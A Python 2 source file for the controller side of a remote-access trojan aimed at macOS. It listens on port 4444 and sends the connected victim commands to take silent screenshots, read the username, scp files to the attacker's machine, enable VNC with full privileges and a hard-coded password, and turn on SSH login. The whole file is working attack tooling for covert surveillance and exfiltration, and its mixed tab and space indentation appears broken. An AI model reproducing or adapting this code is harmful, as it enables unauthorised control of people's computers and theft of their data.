
from sys import *
import socket
import time
import os
from os import *
from multiprocessing import *
import smtplib
import os
from email.MIMEMultipart import MIMEMultipart
from email.MIMEBase import MIMEBase
from email.MIMEText import MIMEText
from email.Utils import COMMASPACE, formatdate
from email import Encoders

list_of_options = ['  getuid ---------------> Gets targets username', '  terminate ------------> Terminates the process', '  options --------------> Shows options', '  screenshot -----------> Takes a screenshot', '  download -------------> Downloads a file to you computer', '  clear ----------------> Clears the terminal window', '  termin (beta) --------> Minimizes targets terminal window (currently in beta)', '  vnc (beta)', '  ssh ------------------> Enables ssh service on the clients computer, exits the sript after, so you need to use this last']

# Creaing socket (this is the information you need to connect, so you have to change the IP address every time you connect to a different network)
def socket_create():
	try:
		global host
		global port
		global s
		host = "127.0.0.1"
		port = 4444
		s = socket.socket()

	except socket.error as msg:
		print("An error occured while creating a socket: " + str(msg))

##################################################################################################################################################

# Binding socket
def socket_bind():
	try:
		global host
		global port
		global s
		print('\n')
		print("Trying to bind socket to port -> " + str(port))
		time.sleep(0.09)
		print("Trying to bind socket to port --> " + str(port))
		time.sleep(0.09)
		print("Trying to bind socket to port ---> " + str(port))
		time.sleep(0.09)
		print("Trying to bind socket to port ----> " + str(port))
		time.sleep(0.09)
		print("Trying to bind socket to port -----> " + str(port))
		time.sleep(0.09)
		print("Trying to bind socket to port ------> " + str(port))
		time.sleep(0.09)
		print("\n")
		print("\n")
		print("Binding to port:  " + str(port))
		print("\n")
		print("Waiting for connection . . . ")
		s.bind((host, port))
		s.listen(5)
	except socket.error as msg:
		print("An error occured while  binding a socket to port: " + str(msg) + "\n" + "Retrying...")
		socket_bind()
#Accepting connections from the client's machine
def socket_accept():
	conn, address = s.accept()
########################################################################################

	print("\n")
	print("[+] Binding to port:  " + str(port) + " successful!")
	print("\n")
	time.sleep(0.4)
	print("[!] Signal Detected")
	print("\n")
	time.sleep(0.1)
	print("Accuiring signal . . .")
	time.sleep(0.1)
	print("\n")
	print("[!] Connecting")
	time.sleep(0.08)
	print("\n")
	print("[+] Connection established with ----> " + " IP " + address[0] + " on PORT " + str(address[1]))
	print("\n")
	print("\n")
	print("TO SEE OPTIONS FOR THE CUSTOM SHELL, USE THE COMMAND 'options'" + '\n')
	print('\n')


	
        while True:
        	command = raw_input("Shell< ")
        	if 'terminate' in command:
                	conn.send('terminate')
                        conn.close()
                	break

		elif command == "getuid":
                        print('\n')
			print('-------[+]client info[+]-------' + '\n')
			print("terminal command ---> 'id -un'" + '\n')
			getuid = 'id -un'
			conn.send(getuid)
			print('\n')
			

		elif command == "options":
                        print('\n')
                        print(" ======================= ")
                        print("||                      ||")
                        print("||        OPTIONS       ||")
                        print("||                      ||") 
                        print(" ======================= ")
                        print('\n')
                        print("=====Command=====      =====Description======" + '\n')
                        for option in list_of_options:
                                print(option + '\n')
                        print('\n')












                elif command == "screenshot":
                        screenshot = 'screencapture -x ~/Documents/log.png'
                        conn.send(screenshot)
                        #scp username@remote:/file/to/send /where/to/put
                        print('\n')
			
                elif command == "copy":
                        uname = raw_input("Target username:  ")
                        if uname == 'cancel':
                                return
                        rhost = raw_input("Target hostname:  ")
                        if rhost == 'cancel':
                                return
                        sourceFile = raw_input("Path to the source file:  ")
                        if sourceFile == 'cancel':
                                return
                        destination = raw_input("Path to the destination:  ")
                        if destination == 'cancel':
                                return
                        copyFile = 'scp -P ' + str(address[1]) + ' ' + uname + '@' + rhost + ':' + sourceFile + ' ' + 'neoUnknown@NeOs-MacBook-Pro-3.local:' + destination
			conn.send(copyFile)
			print('\n')

                elif command == 'clear':
                        os.system('clear')

                elif command == 'termin':
                        #minimizes terminal window for 'x' amount of seconds (fatal command if the dock freezes)
                        minimize = "printf '\e[2t' && sleep 10000000000000 && printf '\e[1t'"
                        conn.send(minimize)
                        print('\n')
                        print("Your target's terminal window has been minimized" + '\n')

                elif command == 'vnc':
                        enableVnc = 'sudo  /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -access -on -clientopts -setvnclegacy -vnclegacy yes -clientopts -setvncpw -vncpw mypasswd -restart -agent -privs -all'
                        connectVnc = 'open vnc://' + address[0]
                        conn.send(enableVnc)
                        conn.send(connectVnc)

                elif command == 'ssh':
                        print("to enable ssh on the targets machine, use the command 'systemsetup -setremotelogin on'" + '\n' + '\n')
                        print("<---------- E N J O Y ---------->")



                

                else:
                        conn.send(command)
                        print conn.recv(1024)
                        

	conn.close()


                

########################################################################################

	


# main function
def main():
	socket_create()
	socket_bind()
	socket_accept()

main()












